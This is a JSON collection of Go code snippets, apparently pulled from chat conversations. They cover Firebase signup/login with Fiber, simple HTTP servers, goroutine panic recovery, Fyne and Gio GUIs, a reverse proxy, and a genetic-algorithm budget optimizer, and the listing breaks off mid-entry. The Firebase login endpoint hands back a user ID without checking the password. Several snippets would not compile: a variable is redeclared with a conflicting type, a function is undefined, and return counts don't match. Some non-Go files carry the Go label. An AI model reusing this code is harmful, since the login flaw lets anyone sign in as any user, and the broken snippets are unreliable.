[
  {
    "conversation_hash": "91d4e87431bcf91795e3f44d496f2b9c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"log\"\n\n\t\"github.com/gofiber/fiber/v2\"\n\n\tfirebase \"firebase.google.com/go/v4\"\n\t\"google.golang.org/api/option\"\n)\n\nfunc main() {\n\tapp := fiber.New()\n\n\tsaPath := \"<PATH_TO_SERVICE_ACCOUNT_JSON_FILE>\" // Replace with the path to your Firebase service account JSON file.\n\topt := option.WithCredentialsFile(saPath)\n\tctx := context.Background()\n\tapp, err := firebase.NewApp(ctx, nil, opt)\n\tif err != nil {\n\t\tlog.Fatalf(\"error initializing app: %v\\n\", err)\n\t}\n\n\tauthClient, err := app.Auth(ctx)\n\tif err != nil {\n\t\tlog.Fatalf(\"error getting Auth client: %v\\n\", err)\n\t}\n\n\tapp.Post(\"/signup\", func(c *fiber.Ctx) error {\n\t\tvar body struct {\n\t\t\tEmail    string `json:\"email\"`\n\t\t\tPassword string `json:\"password\"`\n\t\t}\n\n\t\tc.BodyParser(&body)\n\t\tuserRecord, err := authClient.CreateUser(ctx, (&firebase.UserToCreate{}).Email(body.Email).Password(body.Password))\n\t\tif err != nil {\n\t\t\treturn c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{\"error\": err.Error()})\n\t\t}\n\n\t\treturn c.JSON(fiber.Map{\"uid\": userRecord.UID})\n\t})\n\n\tapp.Post(\"/login\", func(c *fiber.Ctx) error {\n\t\tvar body struct {\n\t\t\tEmail    string `json:\"email\"`\n\t\t\tPassword string `json:\"password\"`\n\t\t}\n\n\t\tc.BodyParser(&body)\n\t\tuserRecord, err := authClient.GetUserByEmail(ctx, body.Email)\n\t\tif err != nil {\n\t\t\treturn c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{\"error\": err.Error()})\n\t\t}\n\n\t\treturn c.JSON(fiber.Map{\"uid\": userRecord.UID})\n\t})\n\n\tapp.Listen(\":3000\")\n}",
    "filename": "91d4e87431bcf91795e3f44d496f2b9c_0.go"
  },
  {
    "conversation_hash": "a3dee9e63fd7871af30f1c9a71f297c9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n)\n\ntype Message struct {\n\tText string `json:\"text\"`\n}\n\nvar messages []Message\n\nfunc main() {\n\thttp.HandleFunc(\"/messages\", handleMessages)\n\thttp.HandleFunc(\"/messages/add\", handleAddMessage)\n\tlog.Fatal(http.ListenAndServe(\":8080\", nil))\n}\n\nfunc handleMessages(w http.ResponseWriter, r *http.Request) {\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tif r.Method == http.MethodGet {\n\t\tjson.NewEncoder(w).Encode(messages)\n\t} else {\n\t\thttp.Error(w, fmt.Sprintf(\"Unsupported method: %s\", r.Method), http.StatusBadRequest)\n\t}\n}\n\nfunc handleAddMessage(w http.ResponseWriter, r *http.Request) {\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tif r.Method == http.MethodPost {\n\t\tvar message Message\n\t\terr := json.NewDecoder(r.Body).Decode(&message)\n\t\tif err != nil {\n\t\t\thttp.Error(w, err.Error(), http.StatusBadRequest)\n\t\t\treturn\n\t\t}\n\t\tmessages = append(messages, message)\n\t\tjson.NewEncoder(w).Encode(messages)\n\t} else {\n\t\thttp.Error(w, fmt.Sprintf(\"Unsupported method: %s\", r.Method), http.StatusBadRequest)\n\t}\n}",
    "filename": "a3dee9e63fd7871af30f1c9a71f297c9_2.go"
  },
  {
    "conversation_hash": "bd51817f57262f9c1e3cea2345e74f71",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "#!/sbin/openrc-run\n\nname=\"filebrowser\"\ncommand=\"/usr/bin/filebrowser\"\ncommand_args=\"--database /var/lib/filebrowser/filebrowser.db\"\n\npidfile=\"/run/${name}.pid\"\ncommand_background=\"true\"\n\ndepend() {\n    need net\n}\n\nstart_pre() {\n    mkdir -p /var/lib/filebrowser\n}",
    "filename": "bd51817f57262f9c1e3cea2345e74f71_1.go"
  },
  {
    "conversation_hash": "9abef7eaaaf65106c30ace84365eac3b",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    maven { url = uri(\"https://jitpack.io\") }\n}\n\ndependencies {\n    implementation(\"com.google.android.material:compose-theme-adapter:1.0.0-alpha02\")\n    implementation(\"com.github.PatrykMilewski:VICO:develop-SNAPSHOT\")\n}",
    "filename": "9abef7eaaaf65106c30ace84365eac3b_6.go"
  },
  {
    "conversation_hash": "9abef7eaaaf65106c30ace84365eac3b",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    maven { url = uri(\"https://jitpack.io\") }\n}\n\ndependencies {\n    implementation(\"com.google.android.material:compose-theme-adapter:1.0.0-alpha02\")\n    implementation(\"com.github.patrykandpatrick:VICO:customview-SNAPSHOT\")\n}",
    "filename": "9abef7eaaaf65106c30ace84365eac3b_12.go"
  },
  {
    "conversation_hash": "93ce7e2fdcafc60b3e1c92e2ffb87c7e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n)\n\nfunc main() {\n\tvar wg sync.WaitGroup\n\terrchan := make(chan interface{}, 1)\n\n\tfor i := 0; i < 3; i++ {\n\t\twg.Add(1)\n\t\tgo func() {\n\t\t\tdefer func() {\n\t\t\t\tif err := recover(); err != nil {\n\t\t\t\t\terrchan <- err\n\t\t\t\t}\n\t\t\t}()\n\n\t\t\tfmt.Printf(\"goroutine %d started\\n\", i)\n\t\t\tpanic(fmt.Sprintf(\"panic in goroutine %d\", i))\n\t\t}()\n\t}\n\n\tgo func() {\n\t\twg.Wait()\n\t\tclose(errchan)\n\t}()\n\n\tfor err := range errchan {\n\t\tfmt.Printf(\"caught panic: %v\\n\", err)\n\t}\n}",
    "filename": "93ce7e2fdcafc60b3e1c92e2ffb87c7e_0.go"
  },
  {
    "conversation_hash": "93ce7e2fdcafc60b3e1c92e2ffb87c7e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc main() {\n\tpanicChan := make(chan interface{}, 1)\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tpanicChan <- r\n\t\t}\n\t}()\n\n\tgo func() {\n\t\tdefer func() {\n\t\t\tif r := recover(); r != nil {\n\t\t\t\tpanicChan <- r\n\t\t\t}\n\t\t}()\n\n\t\tpanic(\"panic in goroutine\")\n\t}()\n\n\terr := <-panicChan\n\tfmt.Printf(\"caught panic: %v\\n\", err)\n}",
    "filename": "93ce7e2fdcafc60b3e1c92e2ffb87c7e_1.go"
  },
  {
    "conversation_hash": "93ce7e2fdcafc60b3e1c92e2ffb87c7e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"sync\"\n)\n\nfunc main() {\n    var wg sync.WaitGroup\n\n    // 创建几个协程\n    for i := 1; i < 10; i++ {\n        wg.Add(1)\n        go func(num int) {\n            defer func() {\n                if err := recover(); err != nil {\n                    fmt.Printf(\"协程%d发生了panic: %v\\n\", num, err)\n                }\n                wg.Done()\n            }()\n\n            // 在协程中抛出异常\n            if num%2 == 0 {\n                panic(fmt.Sprintf(\"协程%d抛出了异常\", num))\n            }\n        }(i)\n    }\n\n    wg.Wait()\n    fmt.Println(\"所有协程执行完成\")\n}",
    "filename": "93ce7e2fdcafc60b3e1c92e2ffb87c7e_2.go"
  },
  {
    "conversation_hash": "93ce7e2fdcafc60b3e1c92e2ffb87c7e",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"reflect\"\n)\n\nfunc main() {\n\tdefer func() {\n\t\tif r := recover(); r != nil {\n\t\t\tfmt.Println(\"Recovered:\", r)\n\t\t\t// 判断 panic 的类型\n\t\t\tif err, ok := r.(error); ok {\n\t\t\t\tfmt.Println(\"Error:\", err.Error())\n\t\t\t}\n\t\t}\n\t}()\n\n\t// 函数调用 panic\n\tpanicFunc()\n\n\t// 结构体方法调用 panic\n\tmp := MyPanic{Value: 42}\n\tv := reflect.ValueOf(&mp).MethodByName(\"Panic\")\n\tv.Call(nil)\n}\n\nfunc panicFunc() {\n\tpanic(\"something went wrong!\")\n}\n\ntype MyPanic struct {\n\tValue int\n}\n\nfunc (mp *MyPanic) Panic() {\n\tpanic(fmt.Sprintf(\"panic occurred with value: %v\", mp.Value))\n}",
    "filename": "93ce7e2fdcafc60b3e1c92e2ffb87c7e_5.go"
  },
  {
    "conversation_hash": "e47e6611b05aeca43160ae8c0ab2ea4f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fyne.io/fyne/v2\"\n    \"fyne.io/fyne/v2/app\"\n    \"fyne.io/fyne/v2/container\"\n    \"fyne.io/fyne/v2/widget\"\n)\n\nfunc main() {\n    myApp := app.New()\n    myWindow := myApp.NewWindow(\"My App\")\n\n    myLabel := widget.NewLabel(\"Hello World!\")\n    myButton := widget.NewButton(\"Click me!\", func() {\n        myLabel.SetText(\"Button clicked!\")\n    })\n\n    myBox := container.NewVBox(myLabel, myButton)\n    myWindow.SetContent(myBox)\n\n    myWindow.ShowAndRun()\n}",
    "filename": "e47e6611b05aeca43160ae8c0ab2ea4f_0.go"
  },
  {
    "conversation_hash": "e47e6611b05aeca43160ae8c0ab2ea4f",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "logo := canvas.NewImageFromFile(\"logo.png\")\n\ntitleLabel := widget.NewLabel(\"My Big Title\")\n\ncontent := container.NewVBox(\n    logo,\n    titleLabel,\n    widget.NewButton(\"Click me!\", func() {\n        titleLabel.SetText(\"Button clicked!\")\n    }),\n)\n\nmyWindow.SetContent(content)",
    "filename": "e47e6611b05aeca43160ae8c0ab2ea4f_4.go"
  },
  {
    "conversation_hash": "e47e6611b05aeca43160ae8c0ab2ea4f",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "list := widget.NewList(\n  func() int {\n    return len(items)\n  },\n  func() fyne.CanvasObject {\n    return widget.NewLabel(\"template\")\n  },\n  func(id widget.ListItemID, template fyne.CanvasObject) {\n    template.(*widget.Label).SetText(items[id])\n  })",
    "filename": "e47e6611b05aeca43160ae8c0ab2ea4f_10.go"
  },
  {
    "conversation_hash": "44ccf0635c9be74822bc028b2d832671",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\n   import (\n   \t\"gioui.org/app\"\n   \t\"gioui.org/layout\"\n   \t\"gioui.org/unit\"\n   \t\"gioui.org/widget\"\n   )\n\n   func main() {\n   \tgo func() {\n   \t\tw := app.NewWindow(app.Title(\"Todos\"), app.Size(unit.Dp(320), unit.Dp(480)))\n   \t\ttodos := make([]string, 0)\n   \t\tnewTask := &widget.Editor{}\n   \t\tlist := &layout.List{}\n   \t\tfor e := range w.Events() {\n   \t\t\tif e, ok := e.(app.UpdateEvent); ok {\n   \t\t\t\tgtx := layout.NewContext(&e.Config, e.Queue, e.Size)\n   \t\t\t\tinputField := layout.Rigid(\n   \t\t\t\t\tfunc(gtx layout.Context) layout.Dimensions {\n   \t\t\t\t\t\tnewTask.Layout(gtx, &e.Config)\n   \t\t\t\t\t\tif newTask.Submit() {\n   \t\t\t\t\t\t\ttext := newTask.Text()\n   \t\t\t\t\t\t\ttodos = append(todos, text)\n   \t\t\t\t\t\t\tnewTask.SetText(\"\")\n   \t\t\t\t\t\t}\n   \t\t\t\t\t\treturn layout.Dimensions{}\n   \t\t\t\t\t})\n   \t\t\t\ttodoList := layout.Flexed(1,\n   \t\t\t\t\tfunc(gtx layout.Context) layout.Dimensions {\n   \t\t\t\t\t\treturn list.Layout(gtx, len(todos), func(gtx layout.Context, index int) layout.Dimensions {\n   \t\t\t\t\t\t\ttext := todos[index]\n   \t\t\t\t\t\t\twidget.Label{Align: layout.Start}.Layout(gtx, &e.Config, text)\n   \t\t\t\t\t\t\treturn layout.Dimensions{}\n   \t\t\t\t\t\t})\n   \t\t\t\t\t})\n   \t\t\t\tlayout.Flex{\n   \t\t\t\t\tAxis:    layout.Vertical,\n   \t\t\t\t\tSpacing: layout.SpaceEvenly,\n   \t\t\t\t}.Layout(gtx, inputField, todoList)\n   \t\t\t\tw.Update(gtx)\n   \t\t\t}\n   \t\t}\n   \t}()\n\n   \tapp.Main()\n   }",
    "filename": "44ccf0635c9be74822bc028b2d832671_1.go"
  },
  {
    "conversation_hash": "416907bd8ad412ebe0d17806059b3748",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/http/httputil\"\n\t\"net/url\"\n)\n\nfunc main() {\n\t// backend servers\n\tserver1 := \"http://localhost:8081\"\n\tserver2 := \"http://localhost:8082\"\n\n\t// parse the backend servers' URLs\n\tserver1Url, _ := url.Parse(server1)\n\tserver2Url, _ := url.Parse(server2)\n\n\t// create a reverse proxy for server 1\n\tserver1Proxy := httputil.NewSingleHostReverseProxy(server1Url)\n\n\t// create a reverse proxy for server 2\n\tserver2Proxy := httputil.NewSingleHostReverseProxy(server2Url)\n\n\t// load balancer\n\tloadBalancer := func(w http.ResponseWriter, r *http.Request) {\n\t\t// randomly select a backend server\n\t\tif r.URL.Path == \"/server-1\" {\n\t\t\tserver1Proxy.ServeHTTP(w, r)\n\t\t} else {\n\t\t\tserver2Proxy.ServeHTTP(w, r)\n\t\t}\n\t}\n\n\t// start the server\n\tfmt.Println(\"Load balancer listening on port 8080...\")\n\thttp.ListenAndServe(\":8080\", http.HandlerFunc(loadBalancer))\n}",
    "filename": "416907bd8ad412ebe0d17806059b3748_0.go"
  },
  {
    "conversation_hash": "8bfa507a8d06f47d5afbfdb6cda477e1",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"log\"\n    \"os\"\n    \"time\"\n)\n\nfunc main() {\n    f, err := os.OpenFile(\"log.txt\", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)\n    if err != nil {\n        log.Fatalf(\"无法创建日志文件: %v\", err)\n    }\n    defer f.Close()\n\n    log.SetOutput(f)\n\n    for {\n        now := time.Now()\n        log.Printf(\"当前时间: %s\", now)\n\n        time.Sleep(5 * time.Second)\n    }\n}",
    "filename": "8bfa507a8d06f47d5afbfdb6cda477e1_0.go"
  },
  {
    "conversation_hash": "4bdddf91b3a2a42c29d242ec1809c947",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"strings\"\n\n\t\"github.com/gorilla/mux\"\n)\n\ntype Ayah struct {\n\tText string `json:\"text\"`\n}\n\ntype Data struct {\n\tAyahs []Ayah `json:\"ayahs\"`\n}\n\ntype ApiResponse struct {\n\tData Data `json:\"data\"`\n}\n\nfunc FetchAyahs(surah int) (string, error) {\n\tresponse, err := http.Get(fmt.Sprintf(\"https://api.alquran.cloud/v1/surah/%d\", surah))\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tdefer response.Body.Close()\n\n\tbody, err := ioutil.ReadAll(response.Body)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\tapiResponse := ApiResponse{}\n\terr = json.Unmarshal(body, &apiResponse)\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\n\tarabicText := []string{}\n\tfor _, ayah := range apiResponse.Data.Ayahs {\n\t\tarabicText = append(arabicText, ayah.Text)\n\t}\n\n\treturn strings.Join(arabicText, \"\\n\"), nil\n}\n\nfunc main() {\n\tr := mux.NewRouter()\n\n\tr.HandleFunc(\"/surah/{id:[0-9]+}\", func(w http.ResponseWriter, r *http.Request) {\n\t\tvars := mux.Vars(r)\n\t\tsurahID := atoi(vars[\"id\"])\n\n\t\tayahs, err := FetchAyahs(surahID)\n\t\tif err != nil {\n\t\t\thttp.Error(w, \"Failed to fetch Ayahs\", http.StatusInternalServerError)\n\t\t\treturn\n\t\t}\n\n\t\tw.WriteHeader(http.StatusOK)\n\t\tw.Write([]byte(ayahs))\n\t})\n\n\thttp.ListenAndServe(\":8000\", r)\n}",
    "filename": "4bdddf91b3a2a42c29d242ec1809c947_1.go"
  },
  {
    "conversation_hash": "56cba143e9a8adbf261c4e1c8f6ae3bc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"time\"\n)\n\nfunc playAyah(ayah string) {\n\taudioFilePath := fmt.Sprintf(\"/path/to/audio/files/%s.mp3\", ayah) // replace with actual audio file path\n\tif _, err := os.Stat(audioFilePath); os.IsNotExist(err) {\n\t\tfmt.Printf(\"Audio file '%s' not found\\n\", audioFilePath)\n\t\treturn\n\t}\n\n\tcmd := exec.Command(\"mpg123\", audioFilePath) // replace with actual audio player command and flags\n\tif err := cmd.Start(); err != nil {\n\t\tfmt.Printf(\"Error starting audio player: %v\\n\", err)\n\t\treturn\n\t}\n\n\t// Wait for audio to play for a few seconds\n\tduration := time.Duration(10) * time.Second\n\ttime.Sleep(duration)\n\n\tif err := cmd.Process.Kill(); err != nil {\n\t\tfmt.Printf(\"Error stopping audio player: %v\\n\", err)\n\t\treturn\n\t}\n}",
    "filename": "56cba143e9a8adbf261c4e1c8f6ae3bc_1.go"
  },
  {
    "conversation_hash": "d3da4f0a03cf192bb4e7b528222cdbbf",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"sort\"\n\t\"time\"\n)\n\ntype Chromosome struct {\n\tAlleles []float64\n\tFitness float64\n}\n\ntype Expenses struct {\n\tFixed    []float64\n\tVariable []float64\n\tPriority []int\n\tBudget   float64\n}\n\ntype Config struct {\n\tPopulationSize int\n\tGenerations    int\n\tMutationRate   float64\n}\n\nfunc main() {\n\texpenses := Expenses{\n\t\tFixed:    []float64{500, 300, 200},\n\t\tVariable: []float64{400, 100, 200, 50, 120},\n\t\tPriority: []int{4, 2, 3, 5, 1},\n\t\tBudget:   1500,\n\t}\n\n\tconfig := Config{\n\t\tPopulationSize: 100,\n\t\tGenerations:    1000,\n\t\tMutationRate:   0.1,\n\t}\n\n\tchrom := geneticAlgorithm(expenses, config)\n\tfmt.Printf(\"Best chromosome: %#v\\n\", chrom)\n}\n\nfunc geneticAlgorithm(exp Expenses, conf Config) Chromosome {\n\trand.Seed(time.Now().UnixNano())\n\n\tpopulation := initializePopulation(conf.PopulationSize, len(exp.Variable))\n\n\tfor i := 0; i < len(population); i++ {\n\t\tpopulation[i].Fitness = calcFitness(population[i], exp)\n\t}\n\n\tfor gen := 0; gen < conf.Generations; gen++ {\n\t\tnewPopulation := make([]Chromosome, 0, conf.PopulationSize)\n\n\t\tfor i := 0; i < conf.PopulationSize; i++ {\n\t\t\tparent1 := selectParent(population)\n\t\t\tparent2 := selectParent(population)\n\n\t\t\tchild := crossover(parent1, parent2)\n\t\t\tmutate(child, conf.MutationRate)\n\n\t\t\tchild.Fitness = calcFitness(child, exp)\n\t\t\tnewPopulation = append(newPopulation, child)\n\t\t}\n\n\t\tpopulation = newPopulation\n\t}\n\n\tbest := findBestChromosome(population)\n\treturn best\n}\n\nfunc calcFitness(chr Chromosome, exp Expenses) float64 {\n\ttotalFixedExp := 0.0\n\tfor _, e := range exp.Fixed {\n\t\ttotalFixedExp += e\n\t}\n\ttotalVariableExp := 0.0\n\tfor i, e := range chr.Alleles {\n\t\ttotalVariableExp += e * exp.Variable[i]\n\t}\n\ttotalExp := totalFixedExp + totalVariableExp\n\tdiff := exp.Budget - totalExp\n\tif diff >= 0 {\n\t\treturn diff\n\t}\n\n\tpenalty := -5.0 * diff\n\tfor i, allele := range chr.Alleles {\n\t\tpenalty -= allele * float64(exp.Priority[i])\n\t}\n\n\treturn penalty\n}\n\nfunc initializePopulation(populationSize, numVariables int) []Chromosome {\n\tpopulation := make([]Chromosome, populationSize)\n\n\tfor i := 0; i < populationSize; i++ {\n\t\tchrom := Chromosome{\n\t\t\tAlleles: make([]float64, numVariables),\n\t\t}\n\n\t\tfor j := 0; j < numVariables; j++ {\n\t\t\tchrom.Alleles[j] = rand.Float64()\n\t\t}\n\n\t\tpopulation[i] = chrom\n\t}\n\n\treturn population\n}\n\nfunc selectParent(population []Chromosome) Chromosome {\n\t// Tournament selection with size 2\n\tidx1 := rand.Intn(len(population))\n\tidx2 := rand.Intn(len(population))\n\n\tif population[idx1].Fitness >= population[idx2].Fitness {\n\t\treturn population[idx1]\n\t}\n\n\treturn population[idx2]\n}\n\nfunc crossover(parent1, parent2 Chromosome) Chromosome {\n\tchild := Chromosome{\n\t\tAlleles: make([]float64, len(parent1.Alleles)),\n\t}\n\n\tcrossoverPoint := rand.Intn(len(parent1.Alleles))\n\n\tfor i := 0; i < len(parent1.Alleles); i++ {\n\t\tif i < crossoverPoint {\n\t\t\tchild.Alleles[i] = parent1.Alleles[i]\n\t\t} else {\n\t\t\tchild.Alleles[i] = parent2.Alleles[i]\n\t\t}\n\t}\n\n\treturn child\n}\n\nfunc mutate(chr Chromosome, mutationRate float64) {\n\tfor i := 0; i < len(chr.Alleles); i++ {\n\t\tif rand.Float64() <= mutationRate {\n\t\t\tchr.Alleles[i] = rand.Float64()\n\t\t}\n\t}\n}\n\nfunc findBestChromosome(population []Chromosome) Chromosome {\n\tbest := population[0]\n\n\tfor _, chr := range population {\n\t\tif chr.Fitness > best.Fitness {\n\t\t\tbest = chr\n\t\t}\n\t}\n\n\treturn best\n}",
    "filename": "d3da4f0a03cf192bb4e7b528222cdbbf_1.go"
  },
  {
    "conversation_hash": "d3da4f0a03cf192bb4e7b528222cdbbf",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/rand\"\n\t\"time\"\n)\n\ntype Chromosome struct {\n\tValues []float64\n\tScore  float64\n}\n\ntype Expenses struct {\n\tFixed         []float64\n\tVariable      []float64\n\tPriority      []int\n\tTotalBudget   float64\n}\n\ntype AlgorithmConfig struct {\n\tNumberOfChromosomes int\n\tNumberOfGenerations int\n\tMutationChance      float64\n}\n\nfunc main() {\n\texpenses := Expenses{\n\t\tFixed:    []float64{500, 300, 200},\n\t\tVariable: []float64{400, 100, 200, 50, 120},\n\t\tPriority: []int{4, 2, 3, 5, 1},\n\t\tTotalBudget:   1500,\n\t}\n\n\tconfig := AlgorithmConfig{\n\t\tNumberOfChromosomes: 100,\n\t\tNumberOfGenerations: 1000,\n\t\tMutationChance:   0.1,\n\t}\n\n\tbest := geneticAlgorithm(expenses, config)\n\tfmt.Printf(\"Best chromosome: %#v\\n\", best)\n}\n\nfunc geneticAlgorithm(exp Expenses, conf AlgorithmConfig) Chromosome {\n\trand.Seed(time.Now().UnixNano())\n\n\tpopulation := initializePopulation(conf.NumberOfChromosomes, len(exp.Variable))\n\n\tfor i := 0; i < len(population); i++ {\n\t\tpopulation[i].Score = calculateScore(population[i], exp)\n\t}\n\n\tfor gen := 0; gen < conf.NumberOfGenerations; gen++ {\n\t\tnewPopulation := make([]Chromosome, 0, conf.NumberOfChromosomes)\n\n\t\tfor i := 0; i < conf.NumberOfChromosomes; i++ {\n\t\t\tparent1 := selectParent(population)\n\t\t\tparent2 := selectParent(population)\n\n\t\t\tchild := crossover(parent1, parent2)\n\t\t\tmutate(child, conf.MutationChance)\n\n\t\t\tchild.Score = calculateScore(child, exp)\n\t\t\tnewPopulation = append(newPopulation, child)\n\t\t}\n\n\t\tpopulation = newPopulation\n\t}\n\n\treturn findBestChromosome(population)\n}\n\nfunc calculateScore(chr Chromosome, exp Expenses) float64 {\n\ttotalFixedExp := 0.0\n\tfor _, e := range exp.Fixed {\n\t\ttotalFixedExp += e\n\t}\n\ttotalVariableExp := 0.0\n\tfor i, e := range chr.Values {\n\t\ttotalVariableExp += e * exp.Variable[i]\n\t}\n\ttotalExp := totalFixedExp + totalVariableExp\n\tdiff := exp.TotalBudget - totalExp\n\tif diff >= 0 {\n\t\treturn diff\n\t}\n\n\tpenalty := -5.0 * diff\n\tfor i, value := range chr.Values {\n\t\tpenalty -= value * float64(exp.Priority[i])\n\t}\n\n\treturn penalty\n}\n\nfunc initializePopulation(populationSize, numVariables int) []Chromosome {\n\tpopulation := make([]Chromosome, populationSize)\n\n\tfor i := 0; i < populationSize; i++ {\n\t\tchrom := Chromosome{\n\t\t\tValues: make([]float64, numVariables),\n\t\t}\n\n\t\tfor j := 0; j < numVariables; j++ {\n\t\t\tchrom.Values[j] = rand.Float64()\n\t\t}\n\n\t\tpopulation[i] = chrom\n\t}\n\n\treturn population\n}\n\nfunc selectParent(population []Chromosome) Chromosome {\n\tidx1 := rand.Intn(len(population))\n\tidx2 := rand.Intn(len(population))\n\n\tif population[idx1].Score >= population[idx2].Score {\n\t\treturn population[idx1]\n\t}\n\n\treturn population[idx2]\n}\n\nfunc crossover(parent1, parent2 Chromosome) Chromosome {\n\tchild := Chromosome{\n\t\tValues: make([]float64, len(parent1.Values)),\n\t}\n\n\tpoint := rand.Intn(len(parent1.Values))\n\n\tfor i := 0; i < len(parent1.Values); i++ {\n\t\tif i < point {\n\t\t\tchild.Values[i] = parent1.Values[i]\n\t\t} else {\n\t\t\tchild.Values[i] = parent2.Values[i]\n\t\t}\n\t}\n\n\treturn child\n}\n\nfunc mutate(chr Chromosome, mutationChance float64) {\n\tfor i := 0; i < len(chr.Values); i++ {\n\t\tif rand.Float64() <= mutationChance {\n\t\t\tchr.Values[i] = rand.Float64()\n\t\t}\n\t}\n}\n\nfunc findBestChromosome(population []Chromosome) Chromosome {\n\tbest := population[0]\n\n\tfor _, chr := range population {\n\t\tif chr.Score > best.Score {\n\t\t\tbest = chr\n\t\t}\n\t}\n\n\treturn best\n}",
    "filename": "d3da4f0a03cf192bb4e7b528222cdbbf_2.go"
  },
  {
    "conversation_hash": "d3da4f0a03cf192bb4e7b528222cdbbf",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/csv\"\n\t\"fmt\"\n\t\"gonum.org/v1/plot/vg\"\n\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\nfunc main() {\n\thttp.Handle(\"/\", http.FileServer(http.Dir(\"./\")))\n\thttp.HandleFunc(\"/optimize\", optimizeHandler)\n\n\tfmt.Println(\"Server running at http://localhost:8080\")\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\nfunc optimizeHandler(w http.ResponseWriter, r *http.Request) {\n    r.ParseForm()\n\n    fixedExpStr := r.FormValue(\"fixedExp\")\n    variableExpStr := r.FormValue(\"variableExp\")\n    priorityStr := r.FormValue(\"priority\")\n    totalBudgetStr := r.FormValue(\"totalBudget\")\n    populationSizeStr := r.FormValue(\"populationSize\")\n    generationsStr := r.FormValue(\"generations\")\n    mutationRateStr := r.FormValue(\"mutationRate\")\n\n    fixedExp := parseFloats(strings.Split(fixedExpStr, \",\"))\n    variableExp := parseFloats(strings.Split(variableExpStr, \",\"))\n    priority := parseInts(strings.Split(priorityStr, \",\"))\n    totalBudget, _ := strconv.ParseFloat(totalBudgetStr, 64)\n    populationSize, _ := strconv.Atoi(populationSizeStr)\n    generations, _ := strconv.Atoi(generationsStr)\n    mutationRate, _ := strconv.ParseFloat(mutationRateStr, 64)\n\n    expenses := Expenses{\n        Fixed:    fixedExp,\n        Variable: variableExp,\n        Priority: priority,\n        Budget:   totalBudget,\n    }\n\n    config := Config{\n        PopulationSize: populationSize,\n        Generations:    generations,\n        MutationRate:   mutationRate,\n    }\n\n    chrom, bestFitnesses := geneticAlgorithm(expenses, config)\n\n    // Generate a graph for best fitness\n    graph := createGraph(bestFitnesses)\n    f, _ := os.Create(\"best_fitness.png\")\n    defer f.Close()\n\n    _, _ = graph.WriteTo(f, 6*vg.Inch, 6*vg.Inch, \"png\")\n\n    fmt.Printf(\"Best chromosome: %#v\\n\", chrom)\n\n    http.Redirect(w, r, \"/?success=true\", http.StatusSeeOther)\n}\n\nfunc parseFloats(strs []string) []float64 {\n    result := make([]float64, len(strs))\n    for i, str := range strs {\n        val, _ := strconv.ParseFloat(str, 64)\n        result[i] = val\n    }\n    return result\n}\n\nfunc parseInts(strs []string) []int {\n    result := make([]int, len(strs))\n    for i, str := range strs {\n        val, _ := strconv.Atoi(str)\n        result[i] = val\n    }\n    return result\n}",
    "filename": "d3da4f0a03cf192bb4e7b528222cdbbf_6.go"
  },
  {
    "conversation_hash": "d3da4f0a03cf192bb4e7b528222cdbbf",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
